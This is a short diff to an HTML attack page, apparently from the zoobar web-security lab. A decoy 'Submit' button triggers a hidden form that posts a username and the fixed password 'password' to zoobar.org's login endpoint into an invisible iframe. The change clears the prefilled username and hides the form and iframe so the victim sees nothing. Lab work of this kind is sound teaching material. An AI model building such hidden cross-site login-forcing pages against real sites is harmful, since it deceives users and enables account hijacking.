@@ -5,9 +5,10 @@
 
   <body>
 
-    <input type="text" name="input_username" value="james" id="input_username">
+    <input type="text" name="input_username" value="" id="input_username">
     <input type="submit" name="fake_button" value="Submit" id="fake_button" onClick="execute()">
 
+    <div style="visibility: hidden">
     <form name="attack_c" target="form_target" action="http://zoobar.org/index.php" method="post">
       <input id="login_username" type="hidden" name="login_username" value="">
       <input id="login_password" type="hidden" name="login_password" value="password">
@@ -17,8 +18,10 @@
 
 
 
-    <iframe name="form_target" width="700" height="500" style="visibility: visible" onLoad="iframe_onload()">
+    <iframe name="form_target" width="700" height="500" style="visibility: hidden" onLoad="iframe_onload()">
     </iframe>
+
+    </div>
 
     
     <script>
